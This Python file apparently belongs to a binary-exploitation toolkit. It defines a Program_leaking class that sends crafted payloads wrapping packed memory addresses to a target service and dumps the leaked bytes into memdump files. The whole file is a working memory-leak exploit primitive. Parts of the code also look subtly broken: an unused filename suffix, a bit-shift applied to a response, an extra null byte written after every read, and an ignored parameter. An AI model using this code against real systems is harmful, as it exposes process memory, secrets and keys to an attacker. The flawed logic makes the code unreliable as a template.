import struct

from request import *


class Program_leaking:

    def __init__(self, before_addr, after_addr, start_addr, stdout = False):
        self.before = before_addr
        self.after = after_addr
        self.start = struct.unpack('I',start_addr)[0]

    def leak(self, m, M):
        try:
            to_add = ''
            i = 1
            while open('memdump_'+str(m)+'_'+str(M)+to_add):
                to_add = '_('+str(i)+')'
                i += 1
        except:
            pass

        mem = ''
        f = open('memdump_'+str(m)+'_'+str(M),'wb+')
        i = m
        while i<M+1:
            tmp = Request().send_receive(self.before+struct.pack('I',self.start+i)+self.after)
            ans = Request.get_answer(tmp>>2)
            if len(ans)>2:
                mem += ans[-1]
                f.write(ans[-1])
                i += len(ans[-1])
            mem += '\x00'
            f.write('\x00')
            i += 1
            f.flush()
